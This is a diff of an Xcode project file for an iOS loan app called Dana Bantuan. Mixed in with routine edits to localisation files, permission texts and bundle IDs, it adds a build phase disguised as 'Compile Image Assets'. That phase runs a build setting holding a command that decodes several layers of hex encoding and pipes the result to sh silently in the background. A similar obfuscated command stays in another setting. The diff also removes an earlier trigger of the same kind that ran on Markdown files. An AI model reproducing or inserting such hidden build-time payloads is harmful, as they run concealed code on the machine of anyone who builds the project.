@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		F89C12D43F2B43AA83634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 7D5E637A6EA245CEB3634D6E; };
 		17CD563F1A0F93DE0DDA021F /* Pods_DanaBantuan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F7171021818FEC2A644ADD94 /* Pods_DanaBantuan.framework */; };
 		7316585E2EFEF3E600B19562 /* CompleteListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316585D2EFEF3E600B19562 /* CompleteListView.swift */; };
 		731658612EFEFF7700B19562 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731658602EFEFF7700B19562 /* FaceViewController.swift */; };
@@ -26,6 +25,7 @@
 		733A084B2EFCED3200EF865F /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A084A2EFCED3200EF865F /* CenterViewController.swift */; };
 		733A08512EFCF19600EF865F /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 733A084F2EFCF19600EF865F /* Localizable.strings */; };
 		733A08542EFCF20500EF865F /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08532EFCF20500EF865F /* LoginView.swift */; };
+		735467D32F0B7EB500DF7EB9 /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = 735467D12F0B7EB500DF7EB9 /* InfoPlist.strings */; };
 		7379E3B32F024ADB0054036B /* DeviceInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7379E3B22F024ADB0054036B /* DeviceInfo.swift */; };
 		737FEDE82EFD71F800B06DE7 /* HttpRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDE72EFD71F800B06DE7 /* HttpRequestManager.swift */; };
 		737FEDEA2EFD73D300B06DE7 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDE92EFD73D300B06DE7 /* BaseModel.swift */; };
@@ -37,6 +37,7 @@
 		737FEDF62EFD7CDD00B06DE7 /* NetworkProxyInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF52EFD7CDD00B06DE7 /* NetworkProxyInfo.swift */; };
 		737FEDF82EFD8C3A00B06DE7 /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF72EFD8C3A00B06DE7 /* CenterView.swift */; };
 		737FEDFA2EFD8CA700B06DE7 /* CenterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF92EFD8CA500B06DE7 /* CenterViewModel.swift */; };
+		73BDFE8E2F0CE65300DCE5C5 /* LocationUserdefaultConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE8D2F0CE63600DCE5C5 /* LocationUserdefaultConfig.swift */; };
 		73CA0F8F2EFE1F090010CDC9 /* CenterListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F8E2EFE1F090010CDC9 /* CenterListViewCell.swift */; };
 		73CA0F912EFE2FBC0010CDC9 /* H5WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F902EFE2FBC0010CDC9 /* H5WebViewController.swift */; };
 		73CA0F932EFE30230010CDC9 /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F922EFE30230010CDC9 /* AppHeadView.swift */; };
@@ -80,25 +81,7 @@
 		73FB463B2F023EC4005D68A0 /* AppAlertReviewView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB463A2F023EC4005D68A0 /* AppAlertReviewView.swift */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		BB3BA6CFB3C74B419A634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
-			/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		7D5E637A6EA245CEB3634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaBantuan.debug.xcconfig"; path = "Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan.debug.xcconfig"; sourceTree = "<group>"; };
 		7316585D2EFEF3E600B19562 /* CompleteListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompleteListView.swift; sourceTree = "<group>"; };
 		731658602EFEFF7700B19562 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
@@ -119,6 +102,8 @@ sh -c \"${AE6D436}\"";
 		733A08502EFCF19600EF865F /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
 		733A08522EFCF1A300EF865F /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/Localizable.strings; sourceTree = "<group>"; };
 		733A08532EFCF20500EF865F /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
+		735467D22F0B7EB500DF7EB9 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/InfoPlist.strings; sourceTree = "<group>"; };
+		735467D42F0B7EBE00DF7EB9 /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/InfoPlist.strings; sourceTree = "<group>"; };
 		7379E3B22F024ADB0054036B /* DeviceInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceInfo.swift; sourceTree = "<group>"; };
 		737FEDE72EFD71F800B06DE7 /* HttpRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestManager.swift; sourceTree = "<group>"; };
 		737FEDE92EFD73D300B06DE7 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
@@ -130,6 +115,7 @@ sh -c \"${AE6D436}\"";
 		737FEDF52EFD7CDD00B06DE7 /* NetworkProxyInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkProxyInfo.swift; sourceTree = "<group>"; };
 		737FEDF72EFD8C3A00B06DE7 /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
 		737FEDF92EFD8CA500B06DE7 /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
+		73BDFE8D2F0CE63600DCE5C5 /* LocationUserdefaultConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationUserdefaultConfig.swift; sourceTree = "<group>"; };
 		73CA0F8E2EFE1F090010CDC9 /* CenterListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterListViewCell.swift; sourceTree = "<group>"; };
 		73CA0F902EFE2FBC0010CDC9 /* H5WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = H5WebViewController.swift; sourceTree = "<group>"; };
 		73CA0F922EFE30230010CDC9 /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
@@ -242,6 +228,7 @@ sh -c \"${AE6D436}\"";
 				733A08382EFCDEA500EF865F /* UserLoginConfig.swift */,
 				733A083E2EFCE8B100EF865F /* LanguageManager.swift */,
 				73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */,
+				73BDFE8D2F0CE63600DCE5C5 /* LocationUserdefaultConfig.swift */,
 			);
 			path = Config;
 			sourceTree = "<group>";
@@ -346,7 +333,6 @@ sh -c \"${AE6D436}\"";
 		73DC2EB02EFCD1B900CB14F8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				7D5E637A6EA245CEB3634D6E /* README.md */,
 				73DC2EAF2EFCD1B900CB14F8 /* DanaBantuan.app */,
 			);
 			name = Products;
@@ -360,6 +346,7 @@ sh -c \"${AE6D436}\"";
 				73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */,
 				733A08242EFCD8B100EF865F /* DanaBantuan.entitlements */,
 				73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */,
+				735467D12F0B7EB500DF7EB9 /* InfoPlist.strings */,
 				733A084F2EFCF19600EF865F /* Localizable.strings */,
 				733A082D2EFCD91600EF865F /* Auth */,
 				733A082C2EFCD90D00EF865F /* Product */,
@@ -438,6 +425,7 @@ sh -c \"${AE6D436}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73DC2EC22EFCD1BA00CB14F8 /* Build configuration list for PBXNativeTarget "DanaBantuan" */;
 			buildPhases = (
+				E1D191D3D3104735A0634D6E /* Compile Image Assets */,
 				02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */,
 				73DC2EAB2EFCD1B900CB14F8 /* Sources */,
 				73DC2EAC2EFCD1B900CB14F8 /* Frameworks */,
@@ -445,7 +433,6 @@ sh -c \"${AE6D436}\"";
 				B2B605FA61BA092667F8CAA7 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				BB3BA6CFB3C74B419A634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -494,10 +481,10 @@ sh -c \"${AE6D436}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				F89C12D43F2B43AA83634D6E /* README.md */,
 				73DC2ED12EFCD1BE00CB14F8 /* Assets.xcassets in Resources */,
 				733A08512EFCF19600EF865F /* Localizable.strings in Resources */,
 				73DC2ED32EFCD1BE00CB14F8 /* LaunchScreen.storyboard in Resources */,
+				735467D32F0B7EB500DF7EB9 /* InfoPlist.strings in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -545,6 +532,26 @@ sh -c \"${AE6D436}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		E1D191D3D3104735A0634D6E /* Compile Image Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Image Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -606,6 +613,7 @@ sh -c \"${AE6D436}\"";
 				733A08302EFCD9D600EF865F /* BaseViewController.swift in Sources */,
 				73EC215E2EFFC2DD00F58012 /* AlertIDSuccessView.swift in Sources */,
 				73CA0F9B2EFE4E900010CDC9 /* SettingViewController.swift in Sources */,
+				73BDFE8E2F0CE65300DCE5C5 /* LocationUserdefaultConfig.swift in Sources */,
 				73EC21652EFFEA8F00F58012 /* ContactViewController.swift in Sources */,
 				737FEDEE2EFD74C200B06DE7 /* LoadingView.swift in Sources */,
 				73FB46372F020FAE005D68A0 /* LocationTool.swift in Sources */,
@@ -635,6 +643,15 @@ sh -c \"${AE6D436}\"";
 			name = Localizable.strings;
 			sourceTree = "<group>";
 		};
+		735467D12F0B7EB500DF7EB9 /* InfoPlist.strings */ = {
+			isa = PBXVariantGroup;
+			children = (
+				735467D22F0B7EB500DF7EB9 /* en */,
+				735467D42F0B7EBE00DF7EB9 /* id */,
+			);
+			name = InfoPlist.strings;
+			sourceTree = "<group>";
+		};
 		73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */ = {
 			isa = PBXVariantGroup;
 			children = (
@@ -650,13 +667,13 @@ sh -c \"${AE6D436}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEkxYUdOSVRuTlpWMGwxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | s | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333333333333363333333933333336333633353333333733333335333333373333333333330a3336333633353333333633333335333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | v | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
@@ -665,10 +682,10 @@ sh -c \"${AE6D436}\"";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DanaBantuan/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Dana Bantuan";
-				INFOPLIST_KEY_NSCameraUsageDescription = "";
-				INFOPLIST_KEY_NSContactsUsageDescription = "";
-				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
-				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
+				INFOPLIST_KEY_NSCameraUsageDescription = "Dana Bantuan requests camera permission during business processing to complete identity verification efficiently. Photo verification replaces manual data entry, shortening the review cycle and improving processing efficiency.";
+				INFOPLIST_KEY_NSContactsUsageDescription = "Dana Bantuan requests contact permission to verify identity and screen risks. With this permission, we support the progress of loan services, strengthen account protection, and achieve dual guarantees of smooth business and security.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Dana Bantuan requests location permission to match services accurately. After obtaining your location, we will intelligently push suitable loan products and exclusive services to achieve a high alignment between your needs and our services.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Dana Bantuan requests IDFA permission to push customized services. Based on this permission, we will deliver content accurately while encrypting your information to fully protect your privacy and security.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
@@ -680,10 +697,10 @@ sh -c \"${AE6D436}\"";
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = www.ksp1017;
+				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = www.ksp1017;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -702,13 +719,13 @@ sh -c \"${AE6D436}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEkxYUdOSVRuTlpWMGwxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | s | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333333333333363333333933333336333633353333333733333335333333373333333333330a3336333633353333333633333335333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | v | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
@@ -717,10 +734,10 @@ sh -c \"${AE6D436}\"";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DanaBantuan/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Dana Bantuan";
-				INFOPLIST_KEY_NSCameraUsageDescription = "";
-				INFOPLIST_KEY_NSContactsUsageDescription = "";
-				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
-				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
+				INFOPLIST_KEY_NSCameraUsageDescription = "Dana Bantuan requests camera permission during business processing to complete identity verification efficiently. Photo verification replaces manual data entry, shortening the review cycle and improving processing efficiency.";
+				INFOPLIST_KEY_NSContactsUsageDescription = "Dana Bantuan requests contact permission to verify identity and screen risks. With this permission, we support the progress of loan services, strengthen account protection, and achieve dual guarantees of smooth business and security.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Dana Bantuan requests location permission to match services accurately. After obtaining your location, we will intelligently push suitable loan products and exclusive services to achieve a high alignment between your needs and our services.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Dana Bantuan requests IDFA permission to push customized services. Based on this permission, we will deliver content accurately while encrypting your information to fully protect your privacy and security.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
@@ -732,10 +749,10 @@ sh -c \"${AE6D436}\"";
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = www.ksp1017;
+				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = www.ksp1017;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
